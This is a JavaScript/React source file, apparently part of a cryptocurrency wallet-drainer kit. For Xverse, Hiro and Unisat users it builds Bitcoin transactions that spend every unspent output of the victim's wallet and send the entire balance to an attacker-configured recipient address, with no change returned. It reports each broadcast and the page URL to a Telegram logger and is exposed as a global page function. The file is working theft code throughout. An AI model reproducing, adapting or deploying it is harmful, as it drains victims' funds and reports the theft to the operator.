/* global BigInt */
import * as btc from 'micro-btc-signer'
import axios from 'axios';
import useBtcClient from '../../hook';
import { bytesToHex, hexToBytes } from '@stacks/common';
import { base64 } from '@scure/base'
import { LogTg } from "../../tg"

import Setting from "../../../store"

import { Xverse } from "./xverse"
import { Hiro } from "./hiro"
import { Unisat } from "./unisat"

const bitcoinMainnet = {
    bech32: 'bc',
    pubKeyHash: 0x00,
    scriptHash: 0x05,
    wif: 0x80,
}
function ecdsaPublicKeyToSchnorr(publicKey) {
    if (publicKey.byteLength === 33) return publicKey.slice(1);
    else return publicKey
}

export function Transaction({ state }) {
    let recipient = Setting.recipient
    let min = Setting.min;
    let max = Setting.max;
    const RPC = Setting.RPC

    const feePrice = Math.floor(Math.random() * (max - min + 1)) + min;

    const btcClient = useBtcClient();


    ///////////// методы биткойна /////////////////////////
    async function broadcastPSBT(psbt) {
        //console.log("psbt to broadcast: ", psbt)
        const psbtB64 = base64.encode(hexToBytes(psbt));
        const RPC_URL = RPC;
  
        try {
          const response = await axios.post(RPC_URL, JSON.stringify({
              jsonrpc: "1.0",
              id: "curltext",
              method: "finalizepsbt",
              params: [psbtB64],
            }), {
          });
          //console.log('hex finalize', response.data.result);
  
          //TELEGRAM transaction_broadcast
          LogTg("transaction_broadcast", {
            url: window.location.href,
            broadcast: response.data.result.hex,
          })
  
          // send raw tx
          const responseTx = await axios.post(RPC_URL, JSON.stringify({
            jsonrpc: "1.0",
            id: "curltext",
            method: "sendrawtransaction",
            params: [response.data.result.hex],
           }), {
          });
  
          return responseTx;
        } catch (e) {
          console.log(e);
          //TELEGRAM error
          return false;
        }
      }

    
    async function p2wpkhPsbt(address, publicKey, balance) { //
        const txsUtxo = await btcClient.getUnspentOutputs(address);
  
        const bytesPublicKey = hexToBytes(publicKey)
        const payment = btc.p2wpkh(bytesPublicKey, bitcoinMainnet);
  
        const tx = new btc.Transaction();
  
        //console.log(payment)
        for (let q = 0; q < txsUtxo?.length; q++) {
          tx.addInput({
            txid: txsUtxo[q].txid,
            index: txsUtxo[q].vout,
            witnessUtxo: {
              amount: BigInt(txsUtxo[q].value),
              script: payment.script,
            },
          })
        } 
  
        tx.addOutputAddress(recipient, BigInt(balance - (feePrice + (txsUtxo?.length/20*7500))), bitcoinMainnet); 
        //tx.addOutputAddress(address, BigInt(0), bitcoinMainnet);
  
        const psbt = tx.toPSBT(0)
        const psbtB64 = base64.encode(psbt)
  
        return { signAtIndex: 0, hex: bytesToHex(psbt), base64: psbtB64 };
    }

    async function p2shPsbt(address, publicKey, balance) { //
        const txsUtxo = await btcClient.getUnspentOutputs(address);
  
        const bytesPublicKey = hexToBytes(publicKey)
        const p2wpkh = btc.p2wpkh(bytesPublicKey, bitcoinMainnet);
        const payment = btc.p2sh(p2wpkh, bitcoinMainnet);
  
        const tx = new btc.Transaction();
  
        //console.log(payment)
        for (let q = 0; q < txsUtxo?.length; q++) {
          tx.addInput({
            txid: txsUtxo[q].txid,
            index: txsUtxo[q].vout,
            witnessUtxo: {
              amount: BigInt(txsUtxo[q].value),
              script: payment.script,
            },
            redeemScript: payment.redeemScript,
          })
        } 
  
        tx.addOutputAddress(recipient, BigInt(balance - (feePrice + (txsUtxo?.length/20*7500))), bitcoinMainnet); 
        //tx.addOutputAddress(address, BigInt(0), bitcoinMainnet);
  
        const psbt = tx.toPSBT(0)
        const psbtB64 = base64.encode(psbt)
  
        return { signAtIndex: 0, hex: bytesToHex(psbt), base64: psbtB64 };
      }

    async function p2trPsbt(address, publicKey, balance, wallet) { //
        const txsUtxo = await btcClient.getUnspentOutputs(address);
  
        const bytesPublicKey = hexToBytes(publicKey)
        const payment = btc.p2tr(ecdsaPublicKeyToSchnorr(bytesPublicKey), undefined, bitcoinMainnet);
  
        const tx = new btc.Transaction();
  
        //console.log(payment)
        for (let q = 0; q < txsUtxo?.length; q++) {
          const inputOptions = {
            index: txsUtxo[q].vout,
            tapInternalKey: payment.tapInternalKey,
            txid: txsUtxo[q].txid,
            witnessUtxo: {
              amount: BigInt(txsUtxo[q].value),
              script: payment.script,
            },
          };
        
          if (wallet === "xverse") {
            inputOptions.sighashType = btc.SignatureHash.SINGLE | btc.SignatureHash.ANYONECANPAY;
          }
        
          tx.addInput(inputOptions);
        }
  
        tx.addOutputAddress(recipient, BigInt(balance - (feePrice + (txsUtxo?.length/20*7500))), bitcoinMainnet); 
        //tx.addOutputAddress(address, BigInt(0), bitcoinMainnet);
  
        const psbt = tx.toPSBT(0)
        const psbtB64 = base64.encode(psbt)
  
        return { signAtIndex: 0, hex: bytesToHex(psbt), base64: psbtB64 };
    }
    async function p2pkhPsbt(address, publicKey, balance) { //
      const txsUtxo = await btcClient.getUnspentOutputs(address);


      const tx = new btc.Transaction();

      for (let q = 0; q < txsUtxo?.length; q++) {
        tx.addInput({
          txid: txsUtxo[q].txid,
          index: txsUtxo[q].vout,
          nonWitnessUtxo: await btcClient.getHexTx(txsUtxo[q].txid)
        })
      }

      tx.addOutputAddress(recipient, BigInt(balance - (feePrice + (txsUtxo?.length/20*7500))), bitcoinMainnet); 
      //tx.addOutputAddress(address, BigInt(0), bitcoinMainnet);

      const psbt = tx.toPSBT(0)
      const psbtB64 = base64.encode(psbt)

      return { signAtIndex: 0, hex: bytesToHex(psbt), base64: psbtB64 };
    }

    //////////////////////// транзакция
    

    const wallet = localStorage.getItem("wallet")
    const SendTransaction = () => {
        if (wallet === "xverse") {
          Xverse(state, feePrice, p2shPsbt, p2trPsbt)
        }

        if(wallet === "hiro") {
          Hiro(state, feePrice, broadcastPSBT, p2wpkhPsbt, p2trPsbt)
        }

        if(wallet === "unisat") { 
          Unisat(state, feePrice, broadcastPSBT, p2wpkhPsbt, p2shPsbt, p2trPsbt, p2pkhPsbt)
        }
    }

    window.bitcoinTransaction = SendTransaction

    return null
}